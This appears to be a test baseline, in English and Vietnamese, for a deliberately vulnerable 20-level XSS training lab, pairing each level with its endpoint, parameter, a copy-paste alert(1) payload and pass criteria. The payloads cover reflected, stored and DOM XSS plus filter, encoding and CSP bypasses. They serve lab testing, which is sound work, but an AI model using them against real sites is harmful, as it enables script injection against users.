# XSS Baseline

This baseline summarizes each level for automated testing. It focuses on
payload reflection/rendering and optional browser execution checks.

| Level | Vuln type | Method | Endpoint | Parameter(s) | Payload | Success criteria |
| --- | --- | --- | --- | --- | --- | --- |
| 1 | Reflected XSS (no filter) | GET | `/level1` | `q` | `<script>alert(1)</script>` | Response contains payload unescaped |
| 2 | Stored XSS | POST + GET | `/level2` | `comment` (POST) | `<script>alert(document.domain)</script>` | Stored payload rendered unescaped on GET |
| 3 | DOM-based XSS (fragment) | GET | `/level3` | fragment | `#<img src=x onerror=alert(1)>` | Browser-only: script executes from hash |
| 4 | Tag filter bypass | GET | `/level4` | `q` | `<img src=x onerror=alert(1)>` | Response contains payload unescaped |
| 5 | Attribute injection | GET | `/level5` | `u` | `" autofocus onfocus="alert(1)` | Response contains injected attributes unescaped |
| 6 | Protocol injection | GET | `/level6` | `link` | `javascript:alert(1)` | Response contains `href="javascript:alert(1)"` |
| 7 | JS string injection | GET | `/level7` | `p` | `';alert(1);'` | Response contains JS string breakout |
| 8 | Double encoding bypass | GET | `/level8` | raw query string | `%253Cscript%253Ealert(1)%253C/script%253E` | Response decodes to `<script>alert(1)</script>` |
| 9 | Client-side template injection | GET | `/level9` | fragment | `#name={{alert(1)}}` | Browser-only: template eval executes |
| 10 | CSP bypass (JSONP) | GET | `/level10` | `q` | `<script src="/api/widgets?callback=alert(1)"></script>` | Response contains script tag unescaped; browser executes JSONP |
| 11 | Entity decode mistake | GET | `/level11` | `q` | `<img src=x onerror=alert(1)>` | Response preview renders payload unescaped |
| 12 | Stored XSS (allowlist bypass) | POST + GET | `/level12` | `comment` (POST) | `<a href="#" onclick="alert(1)">Click</a>` | Stored payload rendered with handler intact |
| 13 | DOM stream (insertAdjacentHTML) | GET | `/level13` | `msg` | `<img src=x onerror=alert(1)>` | Response contains payload for DOM insertion |
| 14 | Template literal injection | GET | `/level14` | `name` | `${alert(1)}` | Response contains template literal payload |
| 15 | Script tag breakout | GET | `/level15` | `title` | `</script><script>alert(1)</script>` | Response contains breakout payload unescaped |
| 16 | Deferred command (setTimeout) | GET | `/level16` | `cmd` | `alert(1)` | Response contains command in JS execution context |
| 17 | srcdoc XSS | GET | `/level17` | `doc` | `<img src=x onerror=alert(1)>` | Response contains payload inside `srcdoc` |
| 18 | Eval console | GET | `/level18` | `calc` | `alert(1)` | Response contains payload in eval context |
| 19 | Protocol filter bypass | GET | `/level19` | `link` | `java%0Ascript:alert(1)` | Response shows decoded link with `javascript:` |
| 20 | LocalStorage stored XSS | GET | `/level20` | UI action | `<img src=x onerror=alert(1)>` (save then load) | Browser-only: payload executes on load |
# XSS Vulnweb Baseline

Baseline mô tả 20 level XSS: endpoint, method, tham số, payload chuẩn và điều kiện pass. Dùng cho test tự động và tài liệu tham chiếu. Pass = payload (hoặc chuỗi nguy hiểm) xuất hiện **raw** trong response (không bị escape), trừ level DOM-only.

| Level | Title | Vuln Type | Endpoint | Method | Params | Payload | Success Condition |
|-------|--------|-----------|----------|--------|--------|---------|--------------------|
| 1 | Data Processing | Reflected XSS (no filter) | /level1 | GET | q | `q=<script>alert(1)</script>` | Response chứa `<script>` raw (không `&lt;script&gt;`) |
| 2 | Message Storage | Stored XSS | /level2 | POST then GET | comment (form) | comment=`<script>alert(1)</script>` | Sau POST, GET /level2 → response chứa payload raw |
| 3 | URL Handler | DOM-based (fragment) | /level3 | GET | (hash, not sent to server) | `#<img src=x onerror=alert(1)>` | **DOM-only**: server không nhận fragment. Cần browser để verify. Test HTTP: response có code đọc `location.hash` + `innerHTML`. |
| 4 | Content Filter | Tag filter bypass | /level4 | GET | q | `q=<img src=x onerror=alert(1)>` | Response chứa `<img` và `onerror` raw |
| 5 | Profile Manager | Attribute injection | /level5 | GET | u | `u=" autofocus onfocus="alert(1)` | Response chứa `onfocus` hoặc `autofocus` raw |
| 6 | Link Validator | Protocol (javascript:) | /level6 | GET | link | `link=javascript:alert(1)` | Response chứa `javascript:` trong href (raw) |
| 7 | System Monitor | JS context string escape | /level7 | GET | p | `p=';alert(1);'` | Response chứa `';alert(1);'` trong script block (raw) |
| 8 | Security Scanner | Double encoding (WAF bypass) | /level8 | GET | q (query string) | `q=%253Cscript%253Ealert(1)%253C/script%253E` | Sau decode 2 lần, response chứa `<script>` raw |
| 9 | Template Engine | CSTI (fragment) | /level9 | GET | (hash) | `#name={{alert(1)}}` | **DOM-only**: hash + eval template. Cần browser để verify. Test HTTP: response có `{{`/eval pattern. |
| 10 | API Dashboard | CSP bypass (JSONP) | /level10 | GET | q | `q=<script src="/api/widgets?callback=alert(1)"></script>` | Response chứa script src với `callback=alert(1)` raw; hoặc GET /api/widgets?callback=alert(1) trả về `alert(1)({...})` |
| 11 | Entity Decoder | Double decode | /level11 | GET | q | `q=<img src=x onerror=alert(1)>` hoặc URL-encoded | Input escape rồi unescape → response chứa `<img`/onerror raw |
| 12 | Guestbook Sanitizer | Allowlist bypass (stored) | /level12 | POST then GET | comment (form) | comment=`<b onmouseover=alert(1)>x</b>` | POST rồi GET → response chứa `onmouseover` raw |
| 13 | DOM Stream | insertAdjacentHTML (query) | /level13 | GET | msg | `msg=<img src=x onerror=alert(1)>` | **Client reads msg from URL**: response có `insertAdjacentHTML` và `params.get('msg')` (vulnerable pattern). Payload không reflect từ server. |
| 14 | Template Literal | Template literal injection | /level14 | GET | name | `name=${alert(1)}` | Response chứa `${alert(1)}` trong script (raw) |
| 15 | Script Breakout | Script tag breakout | /level15 | GET | title | `title=</script><script>alert(1)</script>` (URL-encoded) | Response chứa `</script><script>` raw |
| 16 | Deferred Command | setTimeout(string) | /level16 | GET | cmd | `cmd=alert(1)` | Response chứa `setTimeout` với cmd raw (e.g. `alert(1)`) |
| 17 | Embedded Doc | srcdoc XSS | /level17 | GET | doc | `doc=<img src=x onerror=alert(1)>` | Filter chỉ block script; response chứa `onerror` trong srcdoc (raw) |
| 18 | Eval Console | eval(user input) | /level18 | GET | calc | `calc=alert(1)` | **Client reads calc from URL**: response có `eval(expr)` và `params.get('calc')`. Cần browser để verify execution. |
| 19 | Protocol Filter | Protocol filter bypass (newline) | /level19 | GET | link | `link=java%0Ascript:alert(1)` | Filter check raw; decoded có `javascript:`. Response chứa decoded link (raw) với `javascript:` |
| 20 | LocalStorage Vault | Stored XSS (localStorage) | /level20 | (no server param) | N/A (form + JS) | User nhập `<img src=x onerror=alert(1)>`, Save, Load | **DOM-only**: không reflect từ server. Test HTTP: response có `innerHTML` + `localStorage`. |

## Payloads chi tiết (copy-paste)

- **Level 1**: `?q=<script>alert(1)</script>`
- **Level 2**: POST comment=`<script>alert(1)</script>`, rồi GET /level2
- **Level 3**: `#<img src=x onerror=alert(1)>` (DOM-only)
- **Level 4**: `?q=<img src=x onerror=alert(1)>`
- **Level 5**: `?u=" autofocus onfocus="alert(1)`
- **Level 6**: `?link=javascript:alert(1)`
- **Level 7**: `?p=';alert(1);'`
- **Level 8**: `?q=%253Cscript%253Ealert(1)%253C/script%253E`
- **Level 9**: `#name={{alert(1)}}` (DOM-only)
- **Level 10**: `?q=<script src="/api/widgets?callback=alert(1)"></script>`
- **Level 11**: `?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E` hoặc `?q=<img src=x onerror=alert(1)>`
- **Level 12**: POST comment=`<b onmouseover=alert(1)>Hover</b>`, rồi GET /level12
- **Level 13**: `?msg=<img src=x onerror=alert(1)>` (client-side only in response)
- **Level 14**: `?name=${alert(1)}`
- **Level 15**: `?title=</script><script>alert(1)</script>` (encode nếu cần)
- **Level 16**: `?cmd=alert(1)`
- **Level 17**: `?doc=<img src=x onerror=alert(1)>`
- **Level 18**: `?calc=alert(1)` (client eval)
- **Level 19**: `?link=java%0Ascript:alert(1)`
- **Level 20**: Không có query; dùng form + localStorage (DOM-only)

## Ghi chú

- **DOM-only / cần browser**: Level 3 (hash), 9 (hash + CSTI), 18 (eval từ URL), 20 (localStorage). Test HTTP có thể chỉ assert response chứa đoạn code dễ bị lợi dụng (innerHTML, eval, location.hash, localStorage).
- **Heuristic pass**: Payload hoặc chuỗi đặc trưng (`<script>`, `onerror=`, `javascript:`, `onfocus`, v.v.) xuất hiện dạng raw trong body (không bị escape thành `&lt;`, `&quot;`).
